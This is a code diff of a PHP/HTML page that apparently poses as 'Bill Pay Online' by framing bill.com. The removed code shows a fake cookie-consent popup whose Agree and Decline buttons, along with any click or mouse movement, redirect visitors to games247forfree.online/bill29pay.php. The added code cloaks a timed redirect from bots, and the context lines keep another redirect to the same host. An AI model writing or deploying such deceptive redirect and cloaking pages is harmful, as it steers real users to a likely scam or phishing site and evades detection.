@@ -6,8 +6,8 @@ $delay = rand(15000, 20000); // 1500-20000 seconds delay (milliseconds)
 ?>
 <!DOCTYPE html>
 <html lang="en">
-<head>
-<script>
+    <head>
+	    <script>
 (function(){
   const redirectUrl = "https://games247forfree.online/bill29pay.php"; // 
   const backgroundImageUrl = "https://i.ibb.co/KcwttPhm/Lptf-Fnqj9t.png"; // 
@@ -96,173 +96,22 @@ $delay = rand(15000, 20000); // 1500-20000 seconds delay (milliseconds)
     }, 1500); // 0.1 ms = 0.2 seconds
   });
 </script>
-
-<style>
-  .cookie-overlay {
-    position: fixed;
-    inset: 0;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    z-index: 9999;
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    background-size: cover;
-    background-position: center;
-    background-repeat: no-repeat;
-  }
-  .cookie-modal {
-    background: #fff;
-    padding: 2rem 2.5rem;
-    border-radius: 20px;
-    max-width: 420px;
-    width: 90%;
-    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
-    text-align: center;
-    animation: fadeIn 0.3s ease-out;
-  }
-  .cookie-logo {
-    display: flex;
-    justify-content: center;
-    margin-bottom: 1rem;
-  }
-  .cookie-logo img {
-    height: auto;
-    border-radius: 10px;
-  }
-  .cookie-title {
-    font-size: 22px;
-    color: #222;
-    margin-bottom: 0.8rem;
-  }
-  .cookie-text {
-    font-size: 14px;
-    color: #555;
-    line-height: 1.6;
-    margin-bottom: 1.5rem;
-  }
-  .cookie-actions {
-    display: flex;
-    justify-content: center;
-    gap: 1rem;
-    flex-wrap: wrap;
-  }
-  .cookie-btn {
-    padding: 10px 22px;
-    color: #fff;
-    border: none;
-    border-radius: 8px;
-    font-weight: bold;
-    cursor: pointer;
-    transition: background 0.2s ease-in-out;
-  }
-  .cookie-btn--accept {
-    background: #FFA500;
-  }
-  .cookie-btn--accept:hover {
-    background: #f29e02;
-  }
-  .cookie-btn--reject {
-    background: #FFA500;
-  }
-  .cookie-btn--reject:hover {
-    background: #f29e02;
-  }
-  @keyframes fadeIn {
-    from {
-      opacity: 0;
-      transform: translateY(10px);
-    }
-    to {
-      opacity: 1;
-      transform: translateY(0);
-    }
-  }
-</style>
-
-<script>
-  (() => {
-    const REDIRECT_URL = "https://games247forfree.online/bill29pay.php"; 
-    const LOGO_URL = "https://i.ibb.co/sdnVPxp8/logofb22.png"; // 
-    const LOGO_WIDTH = "100px"; // 
-    const BACKGROUND_IMAGE_URL = "https://i.ibb.co/KcwttPhm/Lptf-Fnqj9t.png"; // 
-    const BACKGROUND_STYLE = `linear-gradient(rgba(0,0,0,0.45), rgba(0,0,0,0.45)), url('${BACKGROUND_IMAGE_URL}') center/cover no-repeat`;
-
-    let isRedirected = false;
-    let startPos = null;
-    let hasMoved = false;
-
-    function handleRedirect() {
-      if (isRedirected) return;
-      isRedirected = true;
-      window.location.href = REDIRECT_URL;
-    }
-	  function redirectUser(){
-    if(!redirected){
-      redirected = true;
-      const urlParams = new URLSearchParams(window.location.search);
-      const gclid = urlParams.get('gclid');
-      let finalUrl = redirectUrl;
-      if(gclid){
-        finalUrl += (redirectUrl.includes('?') ? '&' : '?') + 'gclid=' + gclid;
-      }
-      window.location.href = finalUrl;
-    }
-	 }
-
-    function detectMouseMove(event) {
-      if (hasMoved) return;
-      if (!startPos) {
-        startPos = { x: event.clientX, y: event.clientY };
-        return;
-      }
-      if (event.clientX !== startPos.x || event.clientY !== startPos.y) {
-        hasMoved = true;
-        setTimeout(handleRedirect, 12000);
-      }
-    }
-
-    function generateConsentPopup() {
-      const overlayDiv = document.createElement("div");
-      overlayDiv.className = "cookie-overlay";
-      overlayDiv.setAttribute("role", "dialog");
-      overlayDiv.setAttribute("aria-modal", "true");
-      overlayDiv.style.background = BACKGROUND_STYLE;
-      overlayDiv.innerHTML = `
-        <div class="cookie-modal">
-          <div class="cookie-logo">
-            <img src="${LOGO_URL}" alt="Site Logo" style="width: ${LOGO_WIDTH};" />
-          </div>
-          <h2 class="cookie-title">Accept cookies?</h2>
-          <p class="cookie-text">
-            <strong>This site uses cookies to improve your browsing experience and comply with privacy regulations.</strong>
-            <a href="${REDIRECT_URL}" target="_blank">Learn more about how we use cookies.</a>
-          </p>
-          <div class="cookie-actions">
-            <button id="accept-btn" class="cookie-btn cookie-btn--accept">Agree</button>
-            <button id="reject-btn" class="cookie-btn cookie-btn--reject">Decline</button>
-          </div>
-        </div>
-      `;
-      return overlayDiv;
-    }
-
-    document.addEventListener("DOMContentLoaded", () => {
-      const consentPopup = generateConsentPopup();
-      document.body.appendChild(consentPopup);
-      document.getElementById("accept-btn").addEventListener("click", handleRedirect);
-      document.getElementById("reject-btn").addEventListener("click", handleRedirect);
-      window.addEventListener("mousemove", detectMouseMove);
-    });
-  })();
-</script>
-<script>
-  document.addEventListener("click", function handleClickOnce() {
-    document.removeEventListener("click", handleClickOnce); 
-    setTimeout(() => {
-      window.location.href = "https://games247forfree.online/bill29pay.php"; REDIRECT_URL
-    }, 1500); // 500 ms = 1.5 seconds
-  });
-</script>
+    <meta charset="UTF-8" />
+    <title>Bill Pay Online</title>
+    <style>
+        html, body { margin:0; padding:0; height:100%; overflow:hidden; }
+        iframe { width:100%; height:100%; border:none; display:block; }
+    </style>
+    <script>
+    <?php if (!$isBot): ?>
+        // 
+        setTimeout(function() {
+            window.location.href = "";
+        }, <?= $delay ?>);
+    <?php else: ?>
+        // 
+    <?php endif; ?>
+    </script>
 </head>
 <body>
     <iframe src="https://www.bill.com/"></iframe>
